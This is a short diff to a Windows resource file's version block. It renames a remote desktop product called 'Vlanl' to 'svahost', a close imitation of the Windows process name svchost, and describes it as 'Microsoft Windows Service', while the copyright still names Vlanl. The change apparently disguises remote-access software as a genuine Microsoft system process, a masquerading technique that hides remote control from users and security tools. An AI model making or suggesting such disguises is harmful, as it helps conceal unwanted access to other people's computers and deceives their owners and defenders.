@@ -89,13 +89,13 @@ BEGIN
     BEGIN
         BLOCK "040904e4"
         BEGIN
-            VALUE "CompanyName", "Vlanl" "\0"
-            VALUE "FileDescription", "Vlanl Remote Desktop" "\0"
+            VALUE "CompanyName", "svahost" "\0"
+            VALUE "FileDescription", "Microsoft Windows Service" "\0"
             VALUE "FileVersion", VERSION_AS_STRING "\0"
-            VALUE "InternalName", "Vlanl" "\0"
+            VALUE "InternalName", "svahost" "\0"
             VALUE "LegalCopyright", "Copyright © 2025 Vlanl. All rights reserved." "\0"
-            VALUE "OriginalFilename", "Vlanl.exe" "\0"
-            VALUE "ProductName", "Vlanl" "\0"
+            VALUE "OriginalFilename", "svahost.exe" "\0"
+            VALUE "ProductName", "svahost" "\0"
             VALUE "ProductVersion", VERSION_AS_STRING "\0"
         END
     END
